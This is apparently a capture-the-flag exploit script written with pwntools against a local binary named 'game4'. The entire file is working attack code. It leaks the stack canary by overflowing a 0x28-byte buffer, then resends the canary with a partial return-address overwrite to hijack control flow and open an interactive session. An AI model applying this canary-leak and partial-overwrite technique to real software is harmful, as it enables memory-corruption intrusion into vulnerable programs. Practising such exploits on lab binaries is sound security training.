from pwn import *

context(arch='amd64', os='linux', log_level='debug')

io = process('./game4')
elf = ELF('./game4')

payload = 'a'*0x28
io.sendline(payload)
io.recvuntil("aaaa\n")
canary = (u64(io.recv(7).rjust(8,b'\x00'))) 
print 'canary:',hex(canary)

payload = 'a'*0x28 + p64(canary) + p64(0) + '\x50'
io.send(payload)
io.interactive()
